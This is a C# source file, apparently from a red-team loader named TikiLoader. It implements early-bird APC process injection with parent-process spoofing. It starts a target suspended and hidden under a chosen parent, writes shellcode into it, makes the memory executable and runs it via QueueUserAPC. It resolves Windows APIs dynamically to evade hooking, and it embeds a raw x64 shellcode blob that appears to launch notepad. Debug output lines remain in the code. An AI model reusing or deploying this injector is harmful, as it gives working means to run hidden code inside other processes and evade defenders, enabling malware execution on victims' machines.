using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using static TikiLoader.Enums;
using static TikiLoader.Structs;

namespace TikiLoader
{
    public class DynamicInjector
    {
        public struct DELEGATES
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr VirtualAllocEx(
             IntPtr hProcess,
             IntPtr lpAddress,
             uint dwSize, 
             AllocationType flAllocationType,
             MemoryProtection flProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool WriteProcessMemory(
                IntPtr hProcess, 
                IntPtr lpBaseAddress, 
                byte[] lpBuffer, 
                Int32 nSize,
                out IntPtr lpNumberOfBytesWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool VirtualProtectEx(
                IntPtr hProcess,
                IntPtr lpAddress,
                IntPtr dwSize,
                MemoryProtection flNewProtect,
                out MemoryProtection lpflOldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr CreateRemoteThread(
                IntPtr hProcess,
                IntPtr lpThreadAttributes, 
                uint dwStackSize, 
                IntPtr lpStartAddress, 
                IntPtr lpParameter, 
                uint dwCreationFlags, 
                out IntPtr lpThreadId);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr QueueUserAPC(
                IntPtr pfnAPC,
                IntPtr hThread,
                IntPtr dwData);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint ResumeThread(
                IntPtr hThread);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public delegate bool InitializeProcThreadAttributeList(
               IntPtr lpAttributeList, uint dwAttributeCount, uint dwFlags, ref IntPtr lpSize);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool UpdateProcThreadAttribute(
                IntPtr lpAttributeList,
                uint dwFlags,
                IntPtr Attribute,
                IntPtr lpValue,
                IntPtr cbSize,
                IntPtr lpPreviousValue,
                IntPtr lpReturnSize);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CreateProcessW(
                string lpApplicationName,
                string lpCommandLine,
                ref SECURITY_ATTRIBUTES lpProcessAttributes,
                ref SECURITY_ATTRIBUTES lpThreadAttributes,
                bool bInheritHandles,
                CreationFlags dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                [In] ref STARTUPINFOEX lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            //[return: MarshalAs(UnmanagedType.Bool)]
            public delegate void DeleteProcThreadAttributeList(
                IntPtr lpAttributeList);
        }

        public static byte[] NotepadSc = new byte[344]
        {
            0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
            0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
            0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
            0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
            0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
            0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
            0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
            0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
            0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
            0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
            0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
            0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
            0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
            0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
            0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
            0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
            0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
            0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
            0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
            0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
            0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
            0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
        };

        

        private static bool WriteShellcode(IntPtr hProcess, IntPtr baseAddr, byte[] shellcode)
        {
            IntPtr written = IntPtr.Zero;
            object[] funcargs = 
            {
                hProcess,
                baseAddr,
                shellcode, 
                shellcode.Length, 
                written
            };

            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"WriteProcessMemory", typeof(DELEGATES.WriteProcessMemory), ref funcargs);
        }

        private static bool ChangeVirtualMemory(IntPtr hProcess, IntPtr baseAddr, IntPtr shellcodeLength)
        {
            MemoryProtection oldProtect = new MemoryProtection();
            object[] funcargs =
            {
                hProcess,
                baseAddr,
                shellcodeLength, 
                MemoryProtection.ExecuteRead, 
                oldProtect
            };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualProtectEx", typeof(DELEGATES.VirtualProtectEx), ref funcargs);
        }

        private static IntPtr ResumeTargetProcess(IntPtr hProcess, IntPtr baseAddr)
        {
            IntPtr threadId = IntPtr.Zero;
            object[] funcargs = {
                hProcess,
                IntPtr.Zero,
                0,
                baseAddr,
                IntPtr.Zero,
                0,
                threadId
            };
            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"CreateRemoteThread", typeof(DELEGATES.CreateRemoteThread), ref funcargs);
        }

        private static IntPtr QueueAPC(IntPtr baseAddr, IntPtr hThread)
        {
            object[] funcargs =
            {
                baseAddr, 
                hThread, 
                IntPtr.Zero
            };
            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"QueueUserAPC", typeof(DELEGATES.QueueUserAPC), ref funcargs);
        }

        private static uint ResumeTargetThread(IntPtr hThread)
        {
            object[] funcargs =
            {
                hThread
            };
            return (uint)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"ResumeThread", typeof(DELEGATES.ResumeThread), ref funcargs);
        }

        /*
        private static bool InitializeProcThreadAttributeList(IntPtr hProcess, uint dwAttributeCount, uint dwFlags, ref IntPtr lpsize)
        {
            Console.WriteLine("Inside intiailize proc thread");
            Console.ReadLine();
            object[] funcargs =
            {
                hProcess,
                dwAttributeCount,
                dwFlags,
                lpsize
            };
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"InitializeProcThreadAttributeList", typeof(DELEGATES.InitializeProcThreadAttributeList), ref funcargs);
        }

    */
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);


        /*private static bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)
        {
            object[] funcargs =
            {

                lpAttributeList,
                dwFlags,
                Attribute,
                lpValue,
                cbSize,
                lpPreviousValue,
                lpReturnSize
            };

            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", "UpdateProcThreadAttribute", typeof(DELEGATES.UpdateProcThreadAttribute), ref funcargs);
        }*/
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);


        private static bool CreateProcessW(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            lpProcessInformation = default;
            object[] funcargs =
            {
                lpApplicationName, 
                lpCommandLine,
                lpProcessAttributes,
                lpThreadAttributes,
                bInheritHandles,
                dwCreationFlags,
                lpEnvironment,
                lpCurrentDirectory,
                lpStartupInfo,
                lpProcessInformation
            };
            Console.WriteLine("returning from CreateProcessW");
            return (bool)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", "CreateProcessW", typeof(DELEGATES.CreateProcessW), ref funcargs);

        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        /*
        //[return: MarshalAs(UnmanagedType.Bool)]
        private static void DeleteProcThreadAttributeList(IntPtr lpAttributeList)
        {
            //Console.WriteLine("inside deleterpcothreadattribute");
            //Console.ReadLine();
            object[] funcargs =
            {
                lpAttributeList
            };
            
            DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"DeleteProcThreadAttributeList", typeof(DELEGATES.DeleteProcThreadAttributeList), ref funcargs);
            //Console.WriteLine($"Inside DeleteProcThreadAttribute value is {x} ");
            //return x;
        }
        */

        private static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
        {
            object[] funcargs =
            {
                hProcess,
                lpAddress,
                dwSize,
                flAllocationType,
                flProtect
            };
            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualAllocEx", typeof(DELEGATES.VirtualAllocEx), ref funcargs);
        }

        private static IntPtr AllocateVirtualMemory(IntPtr hProcess, uint length)
        {
            return VirtualAllocEx(hProcess, IntPtr.Zero, length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
        }
        /*
        private static IntPtr AllocateVirutalMemory(IntPtr hProcess, uint length)
        {
            object[] funcargs =
            {
                hProcess,
                IntPtr.Zero,
                length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite
            };
            return (IntPtr)DinvokeGenerics.DynamicAPIInvoke(@"kernel32.dll", @"VirtualAllocEx", typeof(DELEGATES.VirutalAllocEx), ref funcargs);
        }*/

        private const int ProcThreadAttributeParentProcess = 0x00020000;

        public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            Console.WriteLine("inside start process");
            try
            {
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                bool create = CreateProcessW(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
                Console.WriteLine($"inside try finished creatingprocess: {create} ");
                return pInfo;

            }
            catch(Exception ex)
            {
                Console.WriteLine($"inside exception inside dynamicinjector {ex}");
                Debug.WriteLine(GetAllFootprints(ex));
                Console.WriteLine("inside catch returning pInfo");
                return pInfo;
            }
            finally
            {
                Console.WriteLine("inside finally");
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }

        }

        public static string GetAllFootprints(Exception x)
        {
            var st = new StackTrace(x, true);
            var frames = st.GetFrames();
            var traceString = new StringBuilder();

            foreach (var frame in frames)
            {
                if (frame.GetFileLineNumber() < 1)
                    continue;

                traceString.Append("File: " + frame.GetFileName());
                traceString.Append(", Method:" + frame.GetMethod().Name);
                traceString.Append(", LineNumber: " + frame.GetFileLineNumber());
                traceString.Append("  -->  ");
            }

            return traceString.ToString();

        }

        public static void QUAPCInject(string binary, byte[] shellcode, int ppid)
        {
            try
            {
                var pinf = StartProcess(binary, ppid);
                Console.WriteLine("finished starting process");
                var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
                Console.WriteLine("finished allocating memory");
                WriteShellcode(pinf.hProcess, baseAddr, shellcode);
                Console.WriteLine("finished writing shellcode");
                Console.WriteLine($"trying to cast: {(IntPtr)shellcode.Length} ");
                //Environment.Exit(-2);

                ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);


                Console.WriteLine("finished changing virtual memory");
                QueueAPC(baseAddr, pinf.hThread);
                Console.WriteLine("finished queuing apc");
                ResumeTargetThread(pinf.hThread);
                Console.WriteLine("finished resuming target thread");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"an exception occurred changevirtualemoryr {ex}");
                Debug.WriteLine(GetAllFootprints(ex));
            }
        }
    }
}
